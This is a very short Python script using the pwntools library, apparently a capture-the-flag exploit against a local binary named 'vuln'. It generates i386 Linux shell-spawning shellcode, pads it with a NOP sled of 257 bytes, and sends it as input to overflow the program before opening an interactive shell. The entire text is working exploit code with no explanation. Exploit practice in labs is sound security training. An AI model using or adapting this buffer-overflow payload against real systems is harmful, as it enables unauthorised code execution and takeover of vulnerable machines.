from pwn import *
s = process('./vuln')
shellcode = asm(shellcraft.i386.linux.sh())
payload = '\x90'*257+shellcode
s.sendline(payload)
s.interactive()
